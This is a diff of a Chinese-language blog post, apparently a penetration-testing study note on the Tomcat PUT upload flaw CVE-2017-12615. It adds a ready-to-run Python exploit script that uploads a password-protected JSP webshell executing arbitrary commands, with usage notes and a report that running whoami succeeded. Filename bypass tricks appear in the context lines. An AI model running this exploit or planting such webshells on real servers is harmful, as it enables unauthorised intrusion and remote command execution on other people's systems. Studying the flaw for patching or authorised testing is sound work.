@@ -118,7 +118,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    471 字
+                    708 字
                   </span>
                 
 
@@ -128,7 +128,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    3
+                    5
                      分钟
                   </span>
                 
@@ -227,6 +227,70 @@
 <li>shell.jsp::$DATA</li>
 <li>shell.jsp/</li>
 </ul>
+<p><strong>一个利用脚本</strong></p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> time
+
+<span class="hljs-string">'''</span>
+<span class="hljs-string">Usage:</span>
+<span class="hljs-string">	python CVE-2017-12615.py http://127.0.0.1</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">	shell: http://127.0.0.1/py1.jsp?pwd=pass&amp;cmd=whoami</span>
+<span class="hljs-string"></span>
+<span class="hljs-string"></span>
+<span class="hljs-string">'''</span>
+
+proxies = &#123;
+  <span class="hljs-string">"http"</span>: <span class="hljs-string">"http://127.0.0.1:8080"</span>,
+  <span class="hljs-string">"https"</span>: <span class="hljs-string">"http://127.0.0.1:8080"</span>,
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attack</span><span class="hljs-params">(url)</span>:</span>
+	user_agent=<span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"</span>
+	headers=&#123;<span class="hljs-string">"User-Agent"</span>:user_agent&#125;
+	data=<span class="hljs-string">"""&lt;%</span>
+<span class="hljs-string">    if("pass".equals(request.getParameter("pwd")))&#123;</span>
+<span class="hljs-string">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();</span>
+<span class="hljs-string">        int a = -1;</span>
+<span class="hljs-string">        byte[] b = new byte[2048];</span>
+<span class="hljs-string">        out.print("&lt;pre&gt;");</span>
+<span class="hljs-string">        while((a=in.read(b))!=-1)&#123;</span>
+<span class="hljs-string">            out.println(new String(b));</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string">        out.print("&lt;/pre&gt;");</span>
+<span class="hljs-string">    &#125;</span>
+<span class="hljs-string">%&gt;"""</span>
+	<span class="hljs-keyword">try</span>:
+		requests.put(url, headers=headers, data=data, proxies=proxies)
+
+		time.sleep(<span class="hljs-number">2</span>)
+
+		verify_response = requests.get(url[:<span class="hljs-number">-1</span>], headers=headers)
+
+		<span class="hljs-keyword">if</span>(verify_response.status_code == <span class="hljs-number">200</span>):
+			print(<span class="hljs-string">'success!'</span>)
+		<span class="hljs-keyword">else</span> :
+			print(verify_response.status_code)
+
+	<span class="hljs-keyword">except</span> :
+		print(<span class="hljs-string">"error"</span>)
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+	target_url = sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">'/py1.jsp/'</span>
+
+	attack(target_url)
+
+	print(<span class="hljs-string">'shell: '</span> + target_url[:<span class="hljs-number">-1</span>])</code></pre>
+
+<p>密码pwd为pass</p>
+<p>指令cmd为自己输入</p>
+<p><strong>以上设置了代理可以用于抓包分析，不需要可以去掉</strong></p>
+<p>执行成功</p>
+<p><img src="7.png" srcset="/img/loading.gif" alt=""></p>
+<p>访问并执行whoami命令</p>
+<p><img src="8.png" srcset="/img/loading.gif" alt=""></p>
+<p>执行成功</p>
 
             </article>
             <hr>
